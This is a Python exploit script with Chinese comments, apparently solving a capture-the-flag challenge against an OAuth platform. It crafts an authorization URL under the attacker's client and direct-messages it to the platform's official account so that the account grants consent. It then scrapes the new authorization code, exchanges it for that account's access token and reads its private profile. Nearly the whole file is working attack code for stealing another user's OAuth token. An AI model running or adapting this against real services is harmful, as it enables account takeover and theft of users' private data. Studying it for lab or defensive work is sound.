#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
deliver.py —— 本题 exp

★ 一句话原理
------------
**授权码是发给「访问这个链接的人」的。**

所以让别人去访问你的 authorize URL，换出来的 token 就认别人。

平台自己给了一条通道：**把链接私信给官方账号 @official，它会登录试用。**

于是三件事：

    1. 生成 authorize URL（带唯一 state）
    2. 私信给官方（POST {dm_path}，表单字段 to=<收件人>、body=<那个 URL>）
    3. 等官方授权 → 从开放平台页捞出新出现的授权码 → 兑换 → 读资料

这中间没有任何校验被绕过：redirect_uri 是我们自己登记过的合法地址，
真正起作用的是「谁去访问」。

用法
----
    python deliver.py                      # 用 config.json 里的 scope
    python deliver.py --scope profile.private
    python deliver.py --dry-run            # 只看要发出去的 URL，不真发

设计约束（有意为之）
--------------------
* **不 import oauth_flow**。测试仪要反复改，exp 是一次性的，耦合一改就坏。
  代价是几十行辅助函数抄了一遍 —— 换「改测试仪绝不影响 exp」，值。
* **CLI 只有三个开关**。其余参数一律走 config.json。
  可调项越少，真打的时候越不容易出错。
* **集合差集，不是取最新的**。开放平台页会累积列出所有历史授权码，
  还混着干扰项，所以「最新」≠「我这次要的」。
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import secrets
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

try:  # Windows 控制台默认可能是 GBK
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

# ------------------------------------------------------------------ 默认值

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

DEFAULTS = {
    # 平台地址（可选，config.json 里没写就用这个）
    "base_url": "http://172.17.0.13:15633",

    # 凭据与回调 —— 这三个必须来自 config.json
    "client_id": "",
    "client_secret": "",
    "redirect_uri": "",          # ★ 和注册时填的一字不差，不加工、不补域名
    "cookie": "",                # 形如 session=xxxxx

    # 端点
    "authorize_path": "/oauth/authorize",
    "token_path": "/oauth/token",
    "dm_path": "/dm",
    "dev_path": "/dev",
    "api_path": "/api/me",

    # 行为
    "dm_to": "official",         # 私信收件人
    "scope": "profile",          # 不给 --scope 时用这个
    "wait": 90,                  # 等官方授权的最长秒数
    "poll_interval": 5,          # 轮询间隔
    "timeout": 15,
}

# 授权码在页面里的形状（实测）：
#     <div class=mono style="margin-top:8px">授权码：QDsaztlLpuwZCsUrZ5JEaQ</div>
CODE_RE = re.compile(r"授权码\s*[：:]\s*([A-Za-z0-9_\-]+)")

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")


# ------------------------------------------------------------------ HTTP 层

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """禁止自动跟随重定向。

    第 1 棒的 code 是在 302 的 Location 头里的，跟了就看不到。
    返回 None 让 urllib 把 3xx 当错误抛出，我们从 HTTPError.headers 里读 Location。
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def http(method, url, headers=None, data=None, follow=True, timeout=15):
    """发一个请求，返回 (status, headers_lower, body_bytes)。不抛 3xx/4xx/5xx。"""
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    handlers = [] if follow else [_NoRedirect]
    opener = urllib.request.build_opener(*handlers)
    try:
        r = opener.open(req, timeout=timeout)
        return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read()
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, body
    except urllib.error.URLError as e:
        raise RuntimeError(f"连不上 {url}：{e.reason}") from e


def get(cfg, path, accept="text/html,*/*"):
    url = cfg["base_url"].rstrip("/") + path
    h = {"User-Agent": UA, "Accept": accept}
    if cfg.get("cookie"):
        h["Cookie"] = cfg["cookie"]
    return http("GET", url, h, None, follow=True, timeout=cfg["timeout"])


def text_of(html: str, limit: int = 300) -> str:
    t = re.sub(r"<script.*?</script>|<style.*?</style>", " ", html, flags=re.S | re.I)
    return " ".join(re.sub(r"<[^>]+>", " ", t).split())[:limit]


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def jwt_claims(token: str):
    """只解码 JWT payload，不验签。用来确认 sub 是不是官方。"""
    try:
        p = token.split(".")[1]
        return json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
    except Exception:
        return None


# ------------------------------------------------------------------ 配置

def load_config(path: str | None = None) -> dict:
    cfg = dict(DEFAULTS)
    if path is None:
        # 先找当前目录，再找脚本所在目录
        for cand in ("config.json", CONFIG_FILE):
            if os.path.isfile(cand):
                path = cand
                break
    if not path or not os.path.isfile(path):
        raise SystemExit("找不到 config.json\n"
                         "  cp config.example.json config.json\n"
                         "然后填上 client_id / client_secret / redirect_uri / cookie")
    # utf-8-sig：记事本 / PowerShell Set-Content 存出来的 JSON 常带 BOM，
    # 用 utf-8 读会直接 JSONDecodeError。utf-8-sig 两种都能吃。
    with open(path, "r", encoding="utf-8-sig") as f:
        cfg.update({k: v for k, v in json.load(f).items() if not k.startswith("_")})

    # Cookie 容错：'Cookie: a=b' / 带引号 / 带换行 都能吃下
    ck = (cfg.get("cookie") or "").strip()
    if ck.lower().startswith("cookie:"):
        ck = ck.split(":", 1)[1]
    cfg["cookie"] = re.sub(r"\s*;\s*", "; ", re.sub(r"[\r\n]+", " ", ck.strip().strip('"').strip("'"))).strip()
    return cfg


def preflight(cfg: dict) -> list:
    missing = [k for k in ("client_id", "client_secret", "redirect_uri", "cookie")
               if not cfg.get(k)]
    return missing


# ------------------------------------------------------------------ 第 1 步：生成 URL

def build_authorize_url(cfg: dict, scope: str, state: str) -> str:
    params = {
        "response_type": "code",
        "client_id": cfg["client_id"],
        "redirect_uri": cfg["redirect_uri"],   # ★ 和下面兑换时同一个变量
        "scope": scope,
        "state": state,
    }
    # urlencode 负责编码，我们只提供解码后的原值（不手工拼 %3A%2F%2F）
    return (cfg["base_url"].rstrip("/") + cfg["authorize_path"]
            + "?" + urllib.parse.urlencode(params))


# ------------------------------------------------------------------ 第 2 步：私信给官方

def send_dm(cfg: dict, authorize_url: str, verbose: bool):
    """把授权链接私信给官方账号。返回 (ok, 说明)。"""
    url = cfg["base_url"].rstrip("/") + cfg["dm_path"]
    form = {"to": cfg["dm_to"], "body": authorize_url}      # ← 字段名是 body
    headers = {
        "User-Agent": UA,
        "Accept": "text/html,*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url,
    }
    if cfg.get("cookie"):
        headers["Cookie"] = cfg["cookie"]

    if verbose:
        print(f"  [→] POST {url}")
        print(f"      to   = {form['to']}")
        print(f"      body = {authorize_url}")

    status, hdrs, body = http("POST", url, headers,
                              urllib.parse.urlencode(form).encode(),
                              follow=False, timeout=cfg["timeout"])
    location = hdrs.get("location", "")
    if verbose:
        print(f"  [←] {status}   Location: {location or '(无)'}")
        if body:
            print(f"      {text_of(body.decode('utf-8', 'replace'))}")

    if any(w in location.lower() for w in ("login", "signin", "passport")):
        return False, f"被弹到登录页（{location}）→ Cookie 失效，私信没发出去"
    if status in (200, 201, 204, 301, 302, 303, 307, 308):
        return True, f"已私信给 @{form['to']}（HTTP {status}）"
    return False, f"私信失败，HTTP {status}"


# ------------------------------------------------------------------ 第 3 步：等新授权码

def codes_on_dev(cfg: dict, dump: str | None = None) -> list:
    """读开放平台页，返回页面上出现的所有授权码（按顺序）。"""
    status, _, body = get(cfg, cfg["dev_path"])
    html = body.decode("utf-8", "replace")
    if dump:
        with open(dump, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"  [i] 页面已存到 {dump}（{len(html)} 字符）")
    return CODE_RE.findall(html)


def wait_new_code(cfg: dict, baseline: set, verbose: bool) -> str | None:
    """轮询开放平台页，等一个不在基线里的授权码出现。

    用差集而不是「取最新的」：页面会累积列出所有历史 code（还有干扰项），
    「最新」并不等于「我这次要的」。投递前后做差，新出现的那个必然是本次官方授权产生的。
    """
    deadline = time.time() + cfg["wait"]
    interval = max(1.0, cfg["poll_interval"])
    n = 0
    print(f"  [i] 等官方授权（最多 {cfg['wait']}s，每 {interval:g}s 查一次）：", end="", flush=True)

    while time.time() < deadline:
        n += 1
        time.sleep(interval)
        try:
            codes = codes_on_dev(cfg)
        except RuntimeError as e:
            print(f"\n      #{n} 查询失败：{e}")
            continue
        fresh = [c for c in codes if c not in baseline]
        if fresh:
            print(f"\n      #{n} ★ 新授权码：{fresh[-1]}")
            if len(fresh) > 1:
                print(f"          （本次新出现 {len(fresh)} 个，取最后一个）")
            return fresh[-1]
        print(f"\r  [i] 等官方授权… #{n} 无新 code（页面共 {len(codes)} 个），"
              f"剩 {int(deadline - time.time())}s   ", end="", flush=True)

    print()
    print(f"  [!] 等了 {cfg['wait']}s 没等到新授权码")
    print("      先手工在浏览器里发一次私信，确认官方到底会不会响应")
    return None


# ------------------------------------------------------------------ 第 4 步：兑换 + 读资料

def exchange(cfg: dict, code: str, verbose: bool):
    """拿 code 换 access_token。返回 (tok_dict | None, 说明)。"""
    url = cfg["base_url"].rstrip("/") + cfg["token_path"]
    form = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": cfg["redirect_uri"],   # ★ 和第 1 棒一模一样，不加工
        "client_id": cfg["client_id"],
        "client_secret": cfg["client_secret"],
    }
    headers = {"User-Agent": UA, "Accept": "application/json",
               "Content-Type": "application/x-www-form-urlencoded"}
    if verbose:
        print(f"  [→] POST {url}   （换 token）")

    status, _, body = http("POST", url, headers,
                           urllib.parse.urlencode(form).encode(),
                           follow=True, timeout=cfg["timeout"])
    raw = body.decode("utf-8", "replace")
    if verbose:
        print(f"  [←] {status}   {raw[:300]}")

    try:
        tok = json.loads(raw)
    except Exception:
        return None, f"返回不是 JSON（HTTP {status}）：{raw[:200]}"

    if isinstance(tok, dict) and tok.get("access_token"):
        return tok, "ok"
    if isinstance(tok, dict) and tok.get("error"):
        hint = {
            "invalid_grant": "① code 用过/过期 ② redirect_uri 两次不一致 ③ 跨客户端",
            "invalid_client": "公章 / 客户端身份不对",
            "invalid_scope": "这个 scope 名不被接受",
            "invalid_request": "请求格式问题",
        }.get(tok["error"], "")
        return None, f"error={tok['error']}  {tok.get('error_description', '')}  {hint}".strip()
    return None, f"没拿到 token（HTTP {status}）：{raw[:200]}"


def fetch_me(cfg: dict, token: str, verbose: bool):
    """带 Bearer token 读资源。"""
    url = cfg["base_url"].rstrip("/") + cfg["api_path"]
    if verbose:
        print(f"  [→] GET {url}   （带 Bearer）")
    status, hdrs, body = http("GET", url, {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json, */*",
        "User-Agent": UA,
    }, None, follow=True, timeout=cfg["timeout"])
    if verbose:
        print(f"  [←] {status}")
    return status, hdrs.get("www-authenticate"), body.decode("utf-8", "replace")


# ------------------------------------------------------------------ 主流程

def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="deliver.py",
        description="让官方账号成为授权者，拿到它的 token",
        epilog="其余参数都走 config.json —— 可调项越少，真打时越不容易出错。")
    ap.add_argument("--scope", help="要给官方申请哪些权限（默认取 config.json 的 scope）")
    ap.add_argument("--dry-run", action="store_true", help="只生成 URL 和读基线，不真发私信")
    ap.add_argument("--config", help="配置文件路径（默认 ./config.json）")
    ap.add_argument("-v", "--verbose", action="store_true", help="打印每一步的请求和响应")
    args = ap.parse_args(argv)

    cfg = load_config(args.config)
    missing = preflight(cfg)
    if missing:
        print("config.json 里缺这些字段：" + "、".join(missing))
        return 2

    scope = args.scope or cfg["scope"]
    state = secrets.token_urlsafe(12)

    print("=" * 72)
    print(f" 目标     : {cfg['base_url']}")
    print(f" client_id: {cfg['client_id']}")
    print(f" 回调     : {cfg['redirect_uri']}")
    print(f" scope    : {scope}")
    print("=" * 72)

    # ---- 1. 基线：此刻页面上已有的授权码 ----
    print("\n[1/4] 读基线")
    try:
        baseline = set(codes_on_dev(cfg))
        print(f"      开放平台页上已有 {len(baseline)} 个历史 code：{sorted(baseline)}")
    except RuntimeError as e:
        baseline = set()
        print(f"      [!] 读基线失败，按空集处理：{e}")

    # ---- 2. 生成 URL ----
    url = build_authorize_url(cfg, scope, state)
    print("\n[2/4] 生成授权 URL")
    print(f"      {url}")

    if args.dry_run:
        print("\n      --dry-run：没有真发私信。去掉 --dry-run 就会投递。")
        return 0

    # ---- 3. 私信给官方 ----
    print("\n[3/4] 私信给官方")
    ok, msg = send_dm(cfg, url, args.verbose)
    print(f"      {msg}")
    if not ok:
        return 1

    # ---- 4. 等官方授权 ----
    print("\n[4/4] 等官方授权")
    code = wait_new_code(cfg, baseline, args.verbose)
    if not code:
        return 1

    # ---- 兑换 ----
    print("\n[+] 兑换 code")
    tok, msg = exchange(cfg, code, args.verbose)
    if not tok:
        print(f"      兑换失败：{msg}")
        return 1

    token = tok["access_token"]
    print(f"      access_token: {token}")
    print(f"      签发 scope  : {tok.get('scope')}")

    claims = jwt_claims(token)
    if claims:
        sub = claims.get("sub")
        print(f"      JWT sub     : {sub}   ← 应该是官方")
        for k in ("iss", "aud", "client_id", "exp"):
            if k in claims:
                print(f"      {k:<11} : {claims[k]}")

    # ---- 读资料 ----
    print("\n[+] 读资料")
    status, www_auth, body = fetch_me(cfg, token, args.verbose)
    print(f"      GET {cfg['api_path']}  →  {status}")
    if www_auth:
        print(f"      WWW-Authenticate: {www_auth}")
    print("      " + body[:2000].replace("\n", "\n      "))

    print("\n" + "=" * 72)
    return 0


if __name__ == "__main__":
    sys.exit(main())
